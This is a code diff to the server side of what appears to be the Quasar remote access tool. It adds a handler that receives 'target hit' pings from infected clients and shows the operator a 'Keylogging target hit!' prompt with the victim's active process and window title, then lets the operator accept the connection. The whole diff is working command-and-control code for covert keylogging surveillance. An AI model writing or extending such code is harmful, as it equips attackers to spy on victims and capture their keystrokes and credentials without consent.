@@ -116,10 +116,36 @@ namespace Quasar.Server.Networking
                     // Make sure downstream processors (toast/DB) can associate this ping to the UUID.
                     client.Value.Id = uuid;
 
+                    bool accept = _clientDb.GetClientAcceptPing(uuid);
+
+                    // If the client reports a target hit and "Accept Ping" is currently disabled,
+                    // ask the operator whether we should allow the client to connect now.
+                    if (!accept && ping.TargetHit)
+                    {
+                        string proc = ping.ActiveProcessName ?? "";
+                        string title = ping.ActiveWindowTitle ?? "";
+                        if (string.IsNullOrWhiteSpace(proc)) proc = "(unknown process)";
+                        if (string.IsNullOrWhiteSpace(title)) title = "(unknown window title)";
+
+                        var msg =
+                            $"Keylogging target hit!\n\nProcess: {proc}\nWindow: {title}\n\nAllow this client to connect now?";
+
+                        var result = MessageBox.Show(
+                            msg,
+                            "Target Hit",
+                            MessageBoxButtons.YesNo,
+                            MessageBoxIcon.Information);
+
+                        if (result == DialogResult.Yes)
+                        {
+                            _clientDb.SetClientAcceptPing(uuid, true);
+                            accept = true;
+                        }
+                    }
+
                     // Update UI/DB (toast + LastPing) and show notification even when checkbox is not enabled.
                     MessageHandler.Process(client, message);
 
-                    bool accept = _clientDb.GetClientAcceptPing(uuid);
                     client.Send(new ClientIdentificationResult { Result = accept }); // respond to ping handshake
                     if (!accept)
                         client.Disconnect();
